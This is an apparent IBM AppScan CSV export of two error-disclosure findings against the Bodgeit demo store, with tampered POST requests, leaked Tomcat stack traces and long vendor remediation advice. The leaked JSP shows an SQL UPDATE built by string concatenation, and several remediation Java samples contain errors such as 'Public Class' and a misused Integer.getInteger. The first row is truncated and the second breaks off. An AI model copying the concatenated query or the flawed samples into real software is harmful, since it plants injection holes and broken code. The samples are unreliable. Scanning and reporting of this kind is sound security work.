"DemoApps","","Bodgeit","83","Application Error","","Info","Open","2015-10-15","IBM Security AppScan Standard","550","Information Exposure Through Server Error Message","","/bodgeit/basket.jsp","price","","http://localhost/bodgeit/basket.jsp","Parameter: price=0.7 -> price=)","POST /bodgeit/basket.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/product.jsp?prodid=11 Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 31 productid=11&price=)&quantity=1 HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 3069 Date: Thu, 15 Oct 2015 22:23:10 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - An exception occurred processing JSP page /basket.jsp at line 189</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>An exception occurred processing JSP page /basket.jsp at line 189</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: An exception occurred processing JSP page /basket.jsp at line 189 186: quantity += rs.getInt(&quot;quantity&quot;); 187: rs.close(); 188: stmt.close(); 189: stmt = conn.prepareStatement(&quot;UPDATE BasketContents SET quantity = &quot; + Integer.parseInt(quantity) + 190: &quot; WHERE basketid=&quot; + basketId + &quot; AND productid = &quot; + productId); 191: stmt.execute(); 192: if (Integer.parseInt(quantity) &lt; 0) { Stacktrace: org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:575) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;11111111111&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:583) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:277) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","The application has responded with an error message, indicating an undefined state that may expose sensitive information.","<fixRecommendations> <fixRecommendation type=""General""> <text>[1] Check incoming requests for the presence of all expected parameters and values. When a parameter is missing, issue a proper error message or use default values.</text> <text>[2] The application should verify that its input consists of valid characters (after decoding). For example, an input value containing the null byte (encoded as %00), apostrophe, quotes, etc. should be rejected.</text> <text>[3] Enforce values in their expected ranges and types. If your application expects a certain parameter to have a value from a certain set, then the application should ensure that the value it receives indeed belongs to the set. For example, if your application expects a value in the range 10..99, then it should make sure that the value is indeed numeric, and that its value is in 10..99.</text> <text>[4] Verify that the data belongs to the set offered to the client.</text> <text>[5] Do not output debugging error messages and exceptions in a production environment.</text> </fixRecommendation> <fixRecommendation type=""ASP.NET""> <text>In order to disable debugging in ASP.NET, edit your web.config file to contain the following:</text> <text><compilation </text> <indentText> debug=""false""</indentText> <text>/></text> <br></br> <text>For more information, see ""HOW TO: Disable Debugging for ASP.NET Applications"" in: </text> <link target=""http://support.microsoft.com/default.aspx?scid=kb;en-us;815157"">http://support.microsoft.com/default.aspx?scid=kb;en-us;815157</link> <br></br> <text>You can add input validation to Web Forms pages by using validation controls. Validation controls provide an easy-to-use mechanism for all common types of standard validation (for example, testing for valid dates or values within a range), plus ways to provide custom-written validation. In addition, validation controls allow you to completely customize how error information is displayed to the user. Validation controls can be used with any controls that are processed in a Web Forms page's class file, including both HTML and Web server controls.</text> <br></br> <text>To make sure that all the required parameters exist in a request, use the ""RequiredFieldValidator"" validation control. This control ensures that the user does not skip an entry in the web form.</text> <br></br> <text>To make sure user input contains only valid values, you can use one of the following validation controls:</text> <br></br> <text>[1] ""RangeValidator"": checks that a user's entry (value) is between specified lower and upper boundaries. You can check ranges within pairs of numbers, alphabetic characters, and dates.</text> <br></br> <text>[2] ""RegularExpressionValidator"": checks that the entry matches a pattern defined by a regular expression. This type of validation allows you to check for predictable sequences of characters, such as those in social security numbers, e-mail addresses, telephone numbers, postal codes, and so on.</text> <br></br> <text>Important note: validation controls do not block user input or change the flow of page processing; they only set an error state, and produce error messages. It is the programmer's responsibility to test the state of the controls in the code before performing further application-specific actions.</text> <br></br> <text>There are two ways to check for user input validity: </text> <br></br> <text>1. Test for a general error state: </text> <br></br> <text>In your code, test the page's IsValid property. This property rolls up the values of the IsValid properties of all the validation controls on the page (using a logical AND). If one of the validation controls is set to invalid, the page's property will return false.</text> <br></br> <text>2. Test for the error state of individual controls:</text> <br></br> <text>Loop through the page's Validators collection, which contains references to all the validation controls. You can then examine the IsValid property of each validation control.</text> </fixRecommendation> <fixRecommendation type=""J2EE""> <text>** Input Data Validation:</text> <br></br> <text>While data validations may be provided as a user convenience on the client-tier, data validation must be performed on the server-tier using Servlets. Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text> <br></br> <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text> <text>[1] Required field</text> <text>[2] Field data type (all HTTP request parameters are Strings by default)</text> <text>[3] Field length</text> <text>[4] Field range</text> <text>[5] Field options</text> <text>[6] Field pattern</text> <text>[7] Cookie values</text> <text>[8] HTTP Response</text> <br></br> <text>A good practice is to implement the above routine as static methods in a ""Validator"" utility class. The following sections describe an example validator class.</text> <br></br> <text>[1] Required field</text> <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces. </text> <br></br> <text>Example of how to validate required fields:</text> <br></br> <code> // Java example to validate required fields public Class Validator { ... public static boolean validateRequired(String value) { boolean isFieldValid = false; if (value != null && value.trim().length() > 0) { isFieldValid = true; } return isFieldValid; } ... } ... String fieldValue = request.getParameter(""fieldName""); if (Validator.validateRequired(fieldValue)) { // fieldValue is valid, continue processing request ... } </code> <br></br> <text>[2] Field data type</text> <text>In web applications, input parameters are poorly typed. For example, all HTTP request parameters or cookie values are of type String. The developer is responsible for verifying the input is of the correct data type. Use the Java primitive wrapper classes to check if the field value can be safely converted to the desired primitive data type.</text> <br></br> <text>Example of how to validate a numeric field (type int):</text> <br></br> <code> // Java example to validate that a field is an int number public Class Validator { ... public static boolean validateInt(String value) { boolean isFieldValid = false; try { Integer.parseInt(value); isFieldValid = true; } catch (Exception e) { isFieldValid = false; } return isFieldValid; } ... } ... // check if the HTTP request parameter is of type int String fieldValue = request.getParameter(""fieldName""); if (Validator.validateInt(fieldValue)) { // fieldValue is valid, continue processing request ... } </code> <br></br> <text>A good practice is to convert all HTTP request parameters to their respective data types. For example, store the ""integerValue"" of a request parameter in a request attribute and use it as shown in the following example:</text> <br></br> <code> // Example to convert the HTTP request parameter to a primitive wrapper data type // and store this value in a request attribute for further processing String fieldValue = request.getParameter(""fieldName""); if (Validator.validateInt(fieldValue)) { // convert fieldValue to an Integer Integer integerValue = Integer.getInteger(fieldValue); // store integerValue in a request attribute request.setAttribute(""fieldName"", integerValue); } ... // Use the request attribute for further processing Integer integerValue = (Integer)request.getAttribute(""fieldName""); ... </code> <br></br> <text>The primary Java data types that the application should handle:</text> <text>- Byte</text> <text>- Short</text> <text>- Integer</text> <text>- Long</text> <text>- Float</text> <text>- Double</text> <text>- Date</text> <br></br> <text>[3] Field length</text> <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text> <br></br> <text>Example to validate that the length of the userName field is between 8 and 20 characters:</text> <br></br> <code> // Example to validate the field length public Class Validator { ... public static boolean validateLength(String value, int minLength, int maxLength) { String validatedValue = value; if (!validateRequired(value)) { validatedValue = """"; } return (validatedValue.length() >= minLength && validatedValue.length() <= maxLength); } ... } ... String userName = request.getParameter(""userName""); if (Validator.validateRequired(userName)) { if (Validator.validateLength(userName, 8, 20)) { // userName is valid, continue further processing ... } } </code> <br></br> <text>[4] Field range</text> <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text> <br></br> <text>Example to validate that the input numberOfChoices is between 10 and 20:</text> <br></br> <code> // Example to validate the field range public Class Validator { ... public static boolean validateRange(int value, int min, int max) { return (value >= min && value <= max); } ... } ... String fieldValue = request.getParameter(""numberOfChoices""); if (Validator.validateRequired(fieldValue)) { if (Validator.validateInt(fieldValue)) { int numberOfChoices = Integer.parseInt(fieldValue); if (Validator.validateRange(numberOfChoices, 10, 20)) { // numberOfChoices is valid, continue processing request ... } } } </code> <br></br> <text>[5] Field options</text> <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options. Remember that a malicious user can easily modify any option value. Always validate the selected user value against the allowed options as defined by the functional requirements.</text> <br></br> <text>Example to validate the user selection against a list of allowed options:</text> <br></br> <code> // Example to validate user selection against a list of options public Class Validator { ... public static boolean validateOption(Object[] options, Object value) { boolean isValidValue = false; try { List list = Arrays.asList(options); if (list != null) { isValidValue = list.contains(value); } } catch (Exception e) { } return isValidValue; } ... } ... // Allowed options String[] options = {""option1"", ""option2"", ""option3""); // Verify that the user selection is one of the allowed options String userSelection = request.getParameter(""userSelection""); if (Validator.validateOption(options, userSelection)) { // valid user selection, continue processing request ... } </code> <br></br> <text>[6] Field pattern</text> <text>Always check that the user input matches a pattern as defined by the functionality requirements. For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text> <text>^[a-zA-Z0-9]*$</text> <br></br> <text>Java 1.3 or earlier versions do not include any regular expression packages. Apache Regular Expression Package (see Resources below) is recommended for use with Java 1.3 to resolve this lack of support. </text> <text>Example to perform regular expression validation:</text> <br></br> <code> // Example to validate that a given value matches a specified pattern // using the Apache regular expression package import org.apache.regexp.RE; import org.apache.regexp.RESyntaxException; public Class Validator { ... public static boolean matchPattern(String value, String expression) { boolean match = false; if (validateRequired(expression)) { RE r = new RE(expression); match = r.match(value); } return match; } ... } ... // Verify that the userName request parameter is alpha-numeric String userName = request.getParameter(""userName""); if (Validator.matchPattern(userName, ""^[a-zA-Z0-9]*$"")) { // userName is valid, continue processing request ... } </code> <br></br> <text>Java 1.4 introduced a new regular expression package (java.util.regex). Here is a modified version of Validator.matchPattern using the new Java 1.4 regular expression package:</text> <br></br> <code> // Example to validate that a given value matches a specified pattern // using the Java 1.4 regular expression package import java.util.regex.Pattern; import java.util.regexe.Matcher; public Class Validator { ... public static boolean matchPattern(String value, String expression) { boolean match = false; if (validateRequired(expression)) { match = Pattern.matches(expression, value); } return match; } ... } </code> <br></br> <text>[7] Cookie value</text> <text>Use the javax.servlet.http.Cookie object to validate the cookie value. The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text> <br></br> <text>Example to validate a required cookie value:</text> <br></br> <code> // Example to validate a required cookie value // First retrieve all available cookies submitted in the HTTP request Cookie[] cookies = request.getCookies(); if (cookies != null) { // find the ""user"" cookie for (int i=0; i<cookies.length; ++i) { if (cookies[i].getName().equals(""user"")) { // validate the cookie value if (Validator.validateRequired(cookies[i].getValue()) { // valid cookie value, continue processing request ... } } } } </code> <br></br> <text>[8] HTTP Response</text> <text>[8-1] Filter user input</text> <text>To guard the application against cross-site scripting, sanitize HTML by converting sensitive characters to their corresponding character entities. These are the HTML sensitive characters:</text> <text>< > "" ' % ; ) ( & +</text> <br></br> <text>Example to filter a specified string by converting sensitive characters to their corresponding character entities:</text> <br></br> <code> // Example to filter sensitive data to prevent cross-site scripting public Class Validator { ... public static String filter(String value) { if (value == null) { return null; } StringBuffer result = new StringBuffer(value.length()); for (int i=0; i<value.length(); ++i) { switch (value.charAt(i)) { case '<': result.append(""&lt;""); break; case '>': result.append(""&gt;""); break; case '""': result.append(""&quot;""); break; case '\'': result.append(""&#39;""); break; case '%': result.append(""&#37;""); break; case ';': result.append(""&#59;""); break; case '(': result.append(""&#40;""); break; case ')': result.append(""&#41;""); break; case '&': result.append(""&amp;""); break; case '+': result.append(""&#43;""); break; default: result.append(value.charAt(i)); break; } return result; } ... } ... // Filter the HTTP response using Validator.filter PrintWriter out = response.getWriter(); // set output response out.write(Validator.filter(response)); out.close(); </code> <br></br> <text>The Java Servlet API 2.3 introduced Filters, which supports the interception and transformation of HTTP requests or responses.</text> <br></br> <text>Example of using a Servlet Filter to sanitize the response using Validator.filter:</text> <br></br> <code> // Example to filter all sensitive characters in the HTTP response using a Java Filter. // This example is for illustration purposes since it will filter all content in the response, including HTML tags! public class SensitiveCharsFilter implements Filter { ... public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { PrintWriter out = response.getWriter(); ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response); chain.doFilter(request, wrapper); CharArrayWriter caw = new CharArrayWriter(); caw.write(Validator.filter(wrapper.toString())); response.setContentType(""text/html""); response.setContentLength(caw.toString().length()); out.write(caw.toString()); out.close(); } ... public class CharResponseWrapper extends HttpServletResponseWrapper { private CharArrayWriter output; public String toString() { return output.toString(); } public CharResponseWrapper(HttpServletResponse response){ super(response); output = new CharArrayWriter(); } public PrintWriter getWriter(){ return new PrintWriter(output); } } } } </code> <br></br> <text>[8-2] Secure the cookie</text> <text>When storing sensitive data in a cookie, make sure to set the secure flag of the cookie in the HTTP response, using Cookie.setSecure(boolean flag) to instruct the browser to send the cookie using a secure protocol, such as HTTPS or SSL.</text> <br></br> <text>Example to secure the ""user"" cookie:</text> <br></br> <code> // Example to secure a cookie, i.e. instruct the browser to // send the cookie using a secure protocol Cookie cookie = new Cookie(""user"", ""sensitive""); cookie.setSecure(true); response.addCookie(cookie); </code> <br></br> <text>RECOMMENDED JAVA TOOLS</text> <text>The two main Java frameworks for server-side validation are:</text> <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text> <text>The Jakarta Commons Validator is a powerful framework that implements all the above data validation requirements. These rules are configured in an XML file that defines input validation rules for form fields. Struts supports output filtering of dangerous characters in the [8] HTTP Response by default on all data written using the Struts 'bean:write' tag. This filtering may be disabled by setting the 'filter=false' flag.</text> <br></br> <text>Struts defines the following basic input validators, but custom validators may also be defined:</text> <text>required: succeeds if the field contains any characters other than white space.</text> <text>mask: succeeds if the value matches the regular expression given by the mask attribute.</text> <text>range: succeeds if the value is within the values given by the min and max attributes ((value >= min) & (value <= max)).</text> <text>maxLength: succeeds if the field is length is less than or equal to the max attribute.</text> <text>minLength: succeeds if the field is length is greater than or equal to the min attribute.</text> <text>byte, short, integer, long, float, double: succeeds if the value can be converted to the corresponding primitive.</text> <text>date: succeeds if the value represents a valid date. A date pattern may be provided.</text> <text>creditCard: succeeds if the value could be a valid credit card number.</text> <text>e-mail: succeeds if the value could be a valid e-mail address.</text> <br></br> <text>Example to validate the userName field of a loginForm using Struts Validator:</text> <code> <form-validation> <global> ... <validator name=""required"" classname=""org.apache.struts.validator.FieldChecks"" method=""validateRequired"" msg=""errors.required""> </validator> <validator name=""mask"" classname=""org.apache.struts.validator.FieldChecks"" method=""validateMask"" msg=""errors.invalid""> </validator> ... </global> <formset> <form name=""loginForm""> <!-- userName is required and is alpha-numeric case insensitive --> <field property=""userName"" depends=""required,mask""> <!-- message resource key to display if validation fails --> <msg name=""mask"" key=""login.userName.maskmsg""/> <arg0 key=""login.userName.displayname""/> <var> <var-name>mask</var-name> <var-value>^[a-zA-Z0-9]*$</var-value> </var> </field> ... </form> ... </formset> </form-validation> </code> <br></br> <text>[2] JavaServer Faces Technology</text> <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events and input validation.</text> <br></br> <text>The JavaServer Faces API implements the following basic validators, but custom validators may be defined:</text> <text>validate_doublerange: registers a DoubleRangeValidator on a component</text> <text>validate_length: registers a LengthValidator on a component</text> <text>validate_longrange: registers a LongRangeValidator on a component</text> <text>validate_required: registers a RequiredValidator on a component</text> <text>validate_stringrange: registers a StringRangeValidator on a component</text> <text>validator: registers a custom Validator on a component</text> <br></br> <text>The JavaServer Faces API defines the following UIInput and UIOutput Renderers (Tags):</text> <text>input_date: accepts a java.util.Date formatted with a java.text.Date instance</text> <text>output_date: displays a java.util.Date formatted with a java.text.Date instance</text> <text>input_datetime: accepts a java.util.Date formatted with a java.text.DateTime instance</text> <text>output_datetime: displays a java.util.Date formatted with a java.text.DateTime instance</text> <text>input_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text> <text>output_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text> <text>input_text: accepts a text string of one line.</text> <text>output_text: displays a text string of one line.</text> <text>input_time: accepts a java.util.Date, formatted with a java.text.DateFormat time instance</text> <text>output_time: displays a java.util.Date, formatted with a java.text.DateFormat time instance</text> <text>input_hidden: allows a page author to include a hidden variable in a page</text> <text>input_secret: accepts one line of text with no spaces and displays it as a set of asterisks as it is typed</text> <text>input_textarea: accepts multiple lines of text</text> <text>output_errors: displays error messages for an entire page or error messages associated with a specified client identifier</text> <text>output_label: displays a nested component as a label for a specified input field</text> <text>output_message: displays a localized message</text> <br></br> <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text> <code> <%@ taglib uri=""http://java.sun.com/jsf/html"" prefix=""h"" %> <%@ taglib uri=""http://java.sun.com/jsf/core"" prefix=""f"" %> ... <jsp:useBean id=""UserBean"" class=""myApplication.UserBean"" scope=""session"" /> <f:use_faces> <h:form formName=""loginForm"" > <h:input_text id=""userName"" size=""20"" modelReference=""UserBean.userName""> <f:validate_required/> <f:validate_length minimum=""8"" maximum=""20""/> </h:input_text> <!-- display errors if present --> <h:output_errors id=""loginErrors"" clientId=""userName""/> <h:command_button id=""submit"" label=""Submit"" commandName=""submit"" /><p> </h:form> </f:use_faces> </code> <br></br> <br></br> <text>REFERENCES</text> <text>Java API 1.3 - </text> <link target=""http://java.sun.com/j2se/1.3/docs/api/"">http://java.sun.com/j2se/1.3/docs/api/</link> <text>Java API 1.4 - </text> <link target=""http://java.sun.com/j2se/1.4/docs/api/"">http://java.sun.com/j2se/1.4/docs/api/</link> <text>Java Servlet API 2.3 - </text> <link target=""http://java.sun.com/products/servlet/2.3/javadoc/"">http://java.sun.com/products/servlet/2.3/javadoc/</link> <text>Java Regular Expression Package - </text> <link target=""http://jakarta.apache.org/regexp/"">http://jakarta.apache.org/regexp/</link> <text>Jakarta Validator - </text> <link target=""http://jakarta.apache.org/commons/validator/"">http://jakarta.apache.org/commons/validator/</link> <text>JavaServer Faces Technology - </text> <link target=""http://java.sun.com/j2ee/javaserverfaces/"">http://java.sun.com/j2ee/javaserverfaces/</link> <br></br> <text>** Error Handling:</text> <br></br> <text>Many J2EE web application architectures follow the Model View Controller (MVC) pattern. In this pattern a Servlet acts as a Controller. A Servlet delegates the application processing to a JavaBean such as an EJB Session Bean (the Model). The Servlet then forwards the request to a JSP (View) to render the processing results. Servlets should check all input, output, return codes, error codes and known exceptions to ensure that the expected processing actually occurred.</text> <br></br> <text>While data validation protects applications against malicious data tampering, a sound error handling strategy is necessary to prevent the application from inadvertently disclosing internal error messages such as exception stack traces. A good error handling strategy addresses the following items:</text> <br></br> <text>[1] Defining Errors</text> <text>[2] Reporting Errors</text> <text>[3] Rendering Errors</text> <text>[4] Error Mapping</text> <br></br> <text>[1] Defining Errors</text> <text>Hard-coded error messages in the application layer (e.g. Servlets) should be avoided. Instead, the application should use error keys that map to known application failures. A good practice is to define error keys that map to validation rules for HTML form fields or other bean properties. For example, if the ""user_name"" field is required, is alphanumeric, and must be unique in the database, then the following error keys should be defined:</text> <br></br> <text>(a) ERROR_USERNAME_REQUIRED: this error key is used to display a message notifying the user that the ""user_name"" field is required;</text> <text>(b) ERROR_USERNAME_ALPHANUMERIC: this error key is used to display a message notifying the user that the ""user_name"" field should be alphanumeric;</text> <text>(c) ERROR_USERNAME_DUPLICATE: this error key is used to display a message notifying the user that the ""user_name"" value is a duplicate in the database;</text> <text>(d) ERROR_USERNAME_INVALID: this error key is used to display a generic message notifying the user that the ""user_name"" value is invalid;</text> <br></br> <text>A good practice is to define the following framework Java classes which are used to store and report application errors:</text> <br></br> <text>- ErrorKeys: defines all error keys</text> <br></br> <code> // Example: ErrorKeys defining the following error keys: // - ERROR_USERNAME_REQUIRED // - ERROR_USERNAME_ALPHANUMERIC // - ERROR_USERNAME_DUPLICATE // - ERROR_USERNAME_INVALID // ... public Class ErrorKeys { public static final String ERROR_USERNAME_REQUIRED = ""error.username.required""; public static final String ERROR_USERNAME_ALPHANUMERIC = ""error.username.alphanumeric""; public static final String ERROR_USERNAME_DUPLICATE = ""error.username.duplicate""; public static final String ERROR_USERNAME_INVALID = ""error.username.invalid""; ... } </code> <indentText> </indentText> <text>- Error: encapsulates an individual error</text> <br></br> <code> // Example: Error encapsulates an error key. // Error is serializable to support code executing in multiple JVMs. public Class Error implements Serializable { // Constructor given a specified error key public Error(String key) { this(key, null); } // Constructor given a specified error key and array of placeholder objects public Error(String key, Object[] values) { this.key = key; this.values = values; } // Returns the error key public String getKey() { return this.key; } // Returns the placeholder values public Object[] getValues() { return this.values; } private String key = null; private Object[] values = null; } </code> <br></br> <text>- Errors: encapsulates a Collection of errors</text> <br></br> <code> // Example: Errors encapsulates the Error objects being reported to the presentation layer. // Errors are stored in a HashMap where the key is the bean property name and value is an // ArrayList of Error objects. public Class Errors implements Serializable { // Adds an Error object to the Collection of errors for the specified bean property. public void addError(String property, Error error) { ArrayList propertyErrors = (ArrayList)errors.get(property); if (propertyErrors == null) { propertyErrors = new ArrayList(); errors.put(property, propertyErrors); } propertyErrors.put(error); } // Returns true if there are any errors public boolean hasErrors() { return (errors.size > 0); } // Returns the Errors for the specified property public ArrayList getErrors(String property) { return (ArrayList)errors.get(property); } private HashMap errors = new HashMap(); } </code> <br></br> <text>Using the above framework classes, here is an example to process validation errors of the ""user_name"" field:</text> <br></br> <code> // Example to process validation errors of the ""user_name"" field. Errors errors = new Errors(); String userName = request.getParameter(""user_name""); // (a) Required validation rule if (!Validator.validateRequired(userName)) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED)); } // (b) Alpha-numeric validation rule else if (!Validator.matchPattern(userName, ""^[a-zA-Z0-9]*$"")) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC)); } else { // (c) Duplicate check validation rule // We assume that there is an existing UserValidationEJB session bean that implements // a checkIfDuplicate() method to verify if the user already exists in the database. try { ... if (UserValidationEJB.checkIfDuplicate(userName)) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE)); } } catch (RemoteException e) { // log the error logger.error(""Could not validate user for specified userName: "" + userName); errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE); } } // set the errors object in a request attribute called ""errors"" request.setAttribute(""errors"", errors); ... </code> <br></br> <text>[2] Reporting Errors</text> <text>There are two ways to report web-tier application errors:</text> <text>(a) Servlet Error Mechanism</text> <text>(b) JSP Error Mechanism</text> <br></br> <text>[2-a] Servlet Error Mechanism</text> <text>A Servlet may report errors by:</text> <text>- forwarding to the input JSP (having already stored the errors in a request attribute), OR</text> <text>- calling response.sendError with an HTTP error code argument, OR</text> <text>- throwing an exception</text> <br></br> <text>It is good practice to process all known application errors (as described in section [1]), store them in a request attribute, and forward to the input JSP. The input JSP should display the error messages and prompt the user to re-enter the data. The following example illustrates how to forward to an input JSP (userInput.jsp):</text> <br></br> <code> // Example to forward to the userInput.jsp following user validation errors RequestDispatcher rd = getServletContext().getRequestDispatcher(""/user/userInput.jsp""); if (rd != null) { rd.forward(request, response); } </code> <br></br> <text>If the Servlet cannot forward to a known JSP page, the second option is to report an error using the response.sendError method with HttpServletResponse.SC_INTERNAL_SERVER_ERROR (status code 500) as argument. Refer to the javadoc of javax.servlet.http.HttpServletResponse for more details on the various HTTP status codes. </text> <br></br> <text>Example to return a HTTP error:</text> <code> // Example to return a HTTP error code RequestDispatcher rd = getServletContext().getRequestDispatcher(""/user/userInput.jsp""); if (rd == null) { // messages is a resource bundle with all message keys and values response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID)); } </code> <br></br> <text>As a last resort, Servlets can throw an exception, which must be a subclass of one of the following classes:</text> <text>- RuntimeException</text> <text>- ServletException</text> <text>- IOException</text> <br></br> <text>[2-b] JSP Error Mechanism</text> <text>JSP pages provide a mechanism to handle runtime exceptions by defining an errorPage directive as shown in the following example:</text> <br></br> <code> <%@ page errorPage=""/errors/userValidation.jsp"" %> </code> <br></br> <text>Uncaught JSP exceptions are forwarded to the specified errorPage, and the original exception is set in a request p...""\\n""...data exceeds space allotted for cell.","","",""
"DemoApps","","Bodgeit","74","Application Error","","Info","Open","2015-10-15","IBM Security AppScan Standard","550","Information Exposure Through Server Error Message","","/bodgeit/basket.jsp","quantity","","http://localhost/bodgeit/basket.jsp","Parameter: quantity=1 -> quantity=)","POST /bodgeit/basket.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/product.jsp?prodid=11 Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 33 productid=11&price=0.7&quantity=) HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 3069 Date: Thu, 15 Oct 2015 22:23:33 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - An exception occurred processing JSP page /basket.jsp at line 189</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>An exception occurred processing JSP page /basket.jsp at line 189</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: An exception occurred processing JSP page /basket.jsp at line 189 186: quantity += rs.getInt(&quot;quantity&quot;); 187: rs.close(); 188: stmt.close(); 189: stmt = conn.prepareStatement(&quot;UPDATE BasketContents SET quantity = &quot; + Integer.parseInt(quantity) + 190: &quot; WHERE basketid=&quot; + basketId + &quot; AND productid = &quot; + productId); 191: stmt.execute(); 192: if (Integer.parseInt(quantity) &lt; 0) { Stacktrace: org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:575) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;)1111111111&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:569) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:277) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) 